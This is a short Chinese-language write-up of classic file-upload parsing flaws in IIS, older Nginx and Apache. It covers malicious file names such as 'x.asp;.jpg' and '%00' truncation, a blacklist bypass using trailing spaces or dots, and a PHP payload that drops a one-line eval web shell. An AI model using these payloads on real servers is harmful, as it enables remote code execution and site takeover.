各版本wen服务器主要漏洞

我们这次总结一下各个版本的服务器的漏洞

  • IIS 5.X/6.0
  • IIS 7.0/IIS 7.5/ Nginx < 8.03 畸形解析漏洞
  • Nginx < 8.03 空字节代码执行漏洞
  • Apache 解析漏洞
  • 其他

IIS 5.X/6.0 解析漏洞

  1. 目录解析
  • /xx.asp/xx.jpg
    在网站下建立文件夹的名字为 .asp、.asa 的文件夹，其目录内的任何扩展名的文件都被 IIS 当作 asp文件来解析并执行。例如创建目录 vidun.asp，那么 /vidun.asp/1.jpg 将被当作 asp 文件来执行。
  1. 文件解析
  • xx.asp;.jpg
    网站上传图片的时候，将网页木马文件的名字改成“*.asp;.jpg”，也同样会被 IIS当作 asp文件来解析并执行。例如上传一个图片文件，名字叫“vidun.asp;.jpg”的木马文件，该文件可以被当作 asp文件解析并执行。
    IIS6.0默认的可执行除了asp还包括/shell.asa , /shell.cer , /shell.cdk

IIS 7.0/IIS 7.5/ Nginx < 8.03 畸形解析漏洞

  1. 在默认Fast-CGI开启状况下，上传一个名字为test.jpg， 内容为
    <?PHP fputs(fopen('shell.php','w'),'<?php eval($_POST[cmd])?>');?>
    的文件，然后访问test.jpg/.php，在这个目录下就会生成一句话木马 shell.php

  2. IIS 7.0/7.5 默认Fast-CGI开启,直接在url中图片地址后面输入 /1.php，会把正常的图片当成php解析.

Nginx < 8.03 空字节代码执行漏洞

  1. Nginx版本小于等于0.8.37， 利用方法和IIS 7.0/7.5 一样（Fast-CGI 关闭情况下也可利用） 空字节代码 xxx.jpg%00.php ，俗称00截断.

Apache 解析漏洞

Apache是从右到左开始判断解析，如果为不可是别，就再往左判断
比如 shell.php.a.rar  ".a" 和".ra" 这两种后缀是apache不可识别解析的，apache就会把shell.php.a.rar 解析成php

其他

在windows环境下，xx.jpg[空格] 或 xx.jpg.这两类文件都是不允许存在的,若这样命名，windows会默认除去空格或点，利用windows的这种特性，在文件名后加一个空格或点绕过黑名单。若上传成功，空格和点都会被windows自动消除，这样也可以getshell
